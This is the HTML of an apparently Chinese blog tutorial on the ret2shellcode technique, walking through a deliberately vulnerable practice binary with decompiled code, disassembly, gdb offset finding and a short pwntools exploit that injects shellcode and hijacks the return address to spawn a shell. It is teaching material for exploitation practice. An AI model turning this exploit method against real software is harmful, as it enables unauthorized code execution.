@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Ret2Shellcode原理及应用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=Ret2Shellcode原理及应用" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=Ret2Shellcode原理及应用" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&text=Ret2Shellcode原理及应用" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ret2Shellcode原理及应用&body=Check out this article: http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-Ret2Shellcode原理"><span class="toc-number">1.</span> <span class="toc-text">0x 01 Ret2Shellcode原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-实例分析"><span class="toc-number">2.</span> <span class="toc-text">0x 02 实例分析</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Ret2Shellcode原理及应用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-20T07:48:43.000Z" itemprop="datePublished">2020-03-20</time>
+        
+        (Updated: <time datetime="2020-03-20T02:03:48.272Z" itemprop="dateModified">2020-03-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">pwn基础知识</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Ret2Shellcode%E5%8E%9F%E7%90%86/" rel="tag">Ret2Shellcode原理</a>, <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x-01-Ret2Shellcode原理"><a href="#0x-01-Ret2Shellcode原理" class="headerlink" title="0x 01 Ret2Shellcode原理"></a>0x 01 Ret2Shellcode原理</h3><ul>
+<li><p>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell</p>
+</li>
+<li><p>Shellcode获取的两种方式：自己收集和pwntools自带</p>
+</li>
+<li><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+</li>
+<li><p>示意图</p>
+<p>先写入具有攻击性的汇编片段（shellcode）到栈中，然后劫持程序跳转到shellcode的入口处执行</p>
+</li>
+</ul>
+<p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120172248877.png" alt></p>
+<h3 id="0x-02-实例分析"><a href="#0x-02-实例分析" class="headerlink" title="0x 02 实例分析"></a>0x 02 实例分析</h3><p>main函数伪代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);  &#x2F;&#x2F;setvbuf用于内存优化</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main函数汇编</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0x0804852d &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804852e &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x08048530 &lt;+3&gt;:	and    esp,0xfffffff0</span><br><span class="line">0x08048533 &lt;+6&gt;:	add    esp,0xffffff80</span><br><span class="line">0x08048536 &lt;+9&gt;:	mov    eax,ds:0x804a060</span><br><span class="line">0x0804853b &lt;+14&gt;:	mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048543 &lt;+22&gt;:	mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">0x0804854b &lt;+30&gt;:	mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048553 &lt;+38&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048556 &lt;+41&gt;:	call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x0804855b &lt;+46&gt;:	mov    eax,ds:0x804a040</span><br><span class="line">0x08048560 &lt;+51&gt;:	mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048568 &lt;+59&gt;:	mov    DWORD PTR [esp+0x8],0x1</span><br><span class="line">0x08048570 &lt;+67&gt;:	mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048578 &lt;+75&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">0x0804857b &lt;+78&gt;:	call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x08048580 &lt;+83&gt;:	mov    DWORD PTR [esp],0x8048660</span><br><span class="line">0x08048587 &lt;+90&gt;:	call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">0x0804858c &lt;+95&gt;:	lea    eax,[esp+0x1c]</span><br><span class="line">0x08048590 &lt;+99&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048593 &lt;+102&gt;:	call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">0x08048598 &lt;+107&gt;:	mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">0x080485a0 &lt;+115&gt;:	lea    eax,[esp+0x1c]</span><br><span class="line">0x080485a4 &lt;+119&gt;:	mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">0x080485a8 &lt;+123&gt;:	mov    DWORD PTR [esp],0x804a080</span><br><span class="line">0x080485af &lt;+130&gt;:	call   0x8048420 &lt;strncpy@plt&gt;</span><br><span class="line">0x080485b4 &lt;+135&gt;:	mov    DWORD PTR [esp],0x8048680</span><br><span class="line">0x080485bb &lt;+142&gt;:	call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">0x080485c0 &lt;+147&gt;:	mov    eax,0x0</span><br><span class="line">0x080485c5 &lt;+152&gt;:	leave  </span><br><span class="line">0x080485c6 &lt;+153&gt;:	ret</span><br></pre></td></tr></table></figure>
+
+<p>分析strncpy函数的目录字符串地址是0x804a080，运行readelf -S xxx查看bss段位置</p>
+<img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180354508.png" style="zoom:67%;">
+
+<p>是一个BSS段，如果可以我们讲shellcode放到bss段中，然后将函数的返回值改为0x804a080，现在还缺少一个条件，就是bss段0x804a080是否有执行权限，我们断点调试下：</p>
+<p>执行b main 进行断点</p>
+<p>执行r 运行程序</p>
+<p>执行vmmap查看是否有执行权限</p>
+<p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180629000.png" alt="image-20200120180629000"></p>
+<p>0x804a080的区间是在标红的0x0804a000到0x0804b000，有x执行权限</p>
+<p>第二步：查找程序溢出的偏移量</p>
+<p>重新执行gdb ./ret2shellcode命令加载程序</p>
+<p>执行pattern create 200创建字符串</p>
+<p>执行 r运行</p>
+<p>输入刚才创建的字符串</p>
+<p><img src="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk="></p>
+<p>得到0x41384141地址，我们使用pattern offset 0x41384141来查看偏移，得到112偏移量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">标准库函数strncpy()，可以将一字符串的一部分拷贝到另一个字符串中。</span><br><span class="line"></span><br><span class="line">strncpy()函数有3个参数：</span><br><span class="line"></span><br><span class="line">1.参数是目录字符串。</span><br><span class="line"></span><br><span class="line">2.参数是源字符串;</span><br><span class="line"></span><br><span class="line">3.参数是一个整数。代表要从源字符串拷贝到目标字符串中的字符数。</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2shellcode&quot;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">payload &#x3D; shellcode.ljust(112,&#39;a&#39;)+p32(0x804a080)   &#x2F;&#x2F;填充偏移量</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">直接覆盖了main函数的返回地址到0x804a080执行shellcode</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缓冲区溢出-基本ROP-ret2shellcode:</span><br><span class="line">https:&#x2F;&#x2F;blog.51cto.com&#x2F;11797152&#x2F;2379738?source&#x3D;dra</span><br><span class="line">pwntools使用简介2:</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;liuyimin&#x2F;p&#x2F;7379985.html</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-Ret2Shellcode原理"><span class="toc-number">1.</span> <span class="toc-text">0x 01 Ret2Shellcode原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-实例分析"><span class="toc-number">2.</span> <span class="toc-text">0x 02 实例分析</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=Ret2Shellcode原理及应用" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=Ret2Shellcode原理及应用" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&text=Ret2Shellcode原理及应用" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ret2Shellcode原理及应用&body=Check out this article: http://yoursite.com/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
